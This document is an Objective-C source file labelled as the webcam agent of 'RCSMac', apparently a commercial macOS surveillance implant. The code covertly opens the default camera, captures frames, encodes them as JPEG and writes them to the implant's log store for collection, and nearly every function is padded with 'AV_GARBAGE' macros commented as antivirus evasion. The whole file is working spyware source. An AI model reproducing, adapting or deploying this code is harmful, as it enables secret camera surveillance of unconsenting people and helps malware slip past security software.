/*
 * RCSMac - Webcam agent
 *
 *
 * Created by Massimo Chiodini on 05/08/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <ApplicationServices/ApplicationServices.h>

#import "RCSMAgentWebcam.h"
#import "RCSMConfManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

#define BREAK_AND_FREE(x) {if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP) \
                          {if(x != nil) [(NSAutoreleasePool *)x release];break;}}

#define BREAK_AND_FREE_CV(x)  {if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP) \
                              {if(x != nil) [(NSAutoreleasePool *)x release];\
                              @synchronized(self) \
                              {if(mCurrentImageBuffer) CVBufferRelease(mCurrentImageBuffer);mCurrentImageBuffer=NULL;}\
                              break;}}
                              
static __m_MAgentWebcam *sharedAgentWebcam = nil;

@interface __m_MAgentWebcam (hidden)

- (void)captureOutput: (QTCaptureOutput *)captureOutput 
  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
       fromConnection: (QTCaptureConnection *)connection;

- (BOOL)_initSession;

- (BOOL)_startSession;
- (BOOL)_stopSession;

- (BOOL)_releaseSession;

- (BOOL)_startGrabImageWithFrame: (int)nFrame every: (int)seconds;

@end

@implementation __m_MAgentWebcam (hidden)

- (void)captureOutput: (QTCaptureOutput *)captureOutput 
  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
       fromConnection: (QTCaptureConnection *)connection
{     
  // AV evasion: only on release build
  AV_GARBAGE_008
  
#ifdef DEBUG_WEBCAM
  infoLog(@"receiving buffer");
#endif
  
  if (videoFrame == nil )
  {
#ifdef DEBUG_WEBCAM
    infoLog(@"videoFrame none");
#endif
    return;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (mImageGrabbed == YES)
  {
#ifdef DEBUG_WEBCAM
    infoLog(@"mImageGrabbed already grabbed");
#endif
    return;
  }
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  @synchronized(self)
  {
    CVBufferRetain(videoFrame);
    mCurrentImageBuffer = videoFrame;
    mImageGrabbed = YES;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
#ifdef DEBUG_WEBCAM
  infoLog(@"grabbed");
#endif
}

- (BOOL)_releaseSession
{
  [mCaptureDecompressedVideoOutput release];
  [mCaptureDeviceInput release];
  [mCaptureSession release];
  [mDevice close];
  
  mImageGrabbed = NO;
  mCaptureSession = nil;
  mDevice = nil;
  mCaptureDeviceInput = nil;
  mCaptureDecompressedVideoOutput = nil;
  
  return YES;
}

- (BOOL)_initSession
{
  NSError *error;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  mCaptureSession = [[QTCaptureSession alloc] init];  
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  mDevice = [QTCaptureDevice defaultInputDeviceWithMediaType:QTMediaTypeVideo];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (![mDevice open: &error]) 
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      return NO;
    }
  
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  mCaptureDeviceInput = [[QTCaptureDeviceInput alloc] initWithDevice: mDevice];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  @synchronized(self)
    {
      if (![mCaptureSession addInput: mCaptureDeviceInput
                               error: &error]) 
        {
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          return NO;
        }
    }
  
  mCaptureDecompressedVideoOutput = [[QTCaptureDecompressedVideoOutput alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([mCaptureDecompressedVideoOutput delegate] != self)
    [mCaptureDecompressedVideoOutput setDelegate: self];
  
#ifdef DEBUG_WEBCAM
  infoLog(@"delegate: %@", [mCaptureDecompressedVideoOutput delegate]);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  @synchronized(self) 
    {
      if (![mCaptureSession addOutput: mCaptureDecompressedVideoOutput
                                error: &error]) 
        {
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          return NO;
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

- (BOOL)_stopSession
{   
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [mCaptureSession stopRunning];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  while([mCaptureSession isRunning] == YES) 
    usleep(1000);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

- (BOOL)_startSession
{
  [mCaptureSession startRunning];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([mCaptureSession isRunning] == NO) 
    return NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return YES;
}

- (BOOL)_startGrabImageWithFrame: (int)nFrame
                           every: (int)seconds
{ 
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  int count = 0;

  while (count++ < nFrame || nFrame == 0) 
    {   
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
#ifdef DEBUG_WEBCAM
      infoLog(@"starting session");
#endif
      
      if ([self _startSession] == NO) 
        {
          @synchronized(self)
            {   
              // AV evasion: only on release build
              AV_GARBAGE_002
            
              if (mCurrentImageBuffer)
                CVBufferRelease(mCurrentImageBuffer);
              
              // AV evasion: only on release build
              AV_GARBAGE_004
              
              mCurrentImageBuffer = NULL;
            }
          
#ifdef DEBUG_WEBCAM
          infoLog(@"error starting session");
#endif
          
          [innerPool release];
          break;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
#ifdef DEBUG_WEBCAM
      infoLog(@"waiting image...");
#endif
      
      while (mImageGrabbed == NO)
        {
          BREAK_AND_FREE(nil);
          usleep(10000);
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
#ifdef DEBUG_WEBCAM
      infoLog(@"stopping session");
#endif
      
      if ([self _stopSession] == NO) 
        {
          @synchronized(self)
          {
            if (mCurrentImageBuffer)
              CVBufferRelease(mCurrentImageBuffer);
            mCurrentImageBuffer = NULL;
          }   
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          [innerPool release];
          break;
        }
        
      BREAK_AND_FREE_CV(innerPool);
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      if (mCurrentImageBuffer == NULL)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_002
        
          [innerPool release];
          break;
        }
      
#ifdef DEBUG_WEBCAM
      infoLog(@"create JPEG");
#endif
      
      NSBitmapImageRep *bitmap = [[NSBitmapImageRep alloc] 
                                  initWithCIImage: [CIImage imageWithCVImageBuffer: mCurrentImageBuffer]];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      NSData *dataBitmap = [bitmap representationUsingType: NSJPEGFileType
                                                properties: nil];       
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      NSMutableData *dataImage = [[NSMutableData alloc] initWithData: dataBitmap];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
#ifdef DEBUG_WEBCAM
      infoLog(@"create log");
#endif
      
      __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
      BOOL success = [logManager createLog: AGENT_CAM
                               agentHeader: nil
                                 withLogID: 0];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      if (success == TRUE)
        {
          if ([logManager writeDataToLog: dataImage
                                forAgent: AGENT_CAM
                               withLogID: 0] == TRUE)
            {
#ifdef DEBUG_WEBCAM
              infoLog(@"data written correctly");
#endif
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          [logManager closeActiveLog: AGENT_CAM
                           withLogID: 0];
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      [dataImage release];
      [bitmap release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      @synchronized(self)
        {
          if (mCurrentImageBuffer)
            CVBufferRelease(mCurrentImageBuffer);
          mCurrentImageBuffer = NULL;
          
          mImageGrabbed = NO;
        }

      [innerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      for(int sc=0; sc < seconds; sc++)
        {
          BREAK_AND_FREE(nil);
          sleep(1);
        }   
     
      // AV evasion: only on release build
      AV_GARBAGE_004
      
    }
    
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;  
}

@end

@implementation __m_MAgentWebcam

+ (__m_MAgentWebcam *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentWebcam == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentWebcam;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentWebcam == nil)
      {
        sharedAgentWebcam = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentWebcam;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentWebcam != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedAgentWebcam = self;
            mImageGrabbed = NO;
            mCurrentImageBuffer = NULL;
            mCaptureSession = nil;
            mDevice = nil;
            mCaptureDeviceInput = nil;
            mCaptureDecompressedVideoOutput = nil;
          }
      }
  }
  
  return sharedAgentWebcam;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)retain
{
  return self;
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
         internalCounter <= MAX_STOP_WAIT_TIME)
  {
    internalCounter++;
    usleep(100000);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
                          
  if ([self _initSession] == YES)
    {
      if ([self _startGrabImageWithFrame: 1 every: 0] == YES)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_000
        
#ifdef DEBUG_WEBCAM
          infoLog(@"Webcam grabbing done!");
#endif
        }

      [self _releaseSession];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [outerPool release];
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return mAgentConfiguration;
}

@end
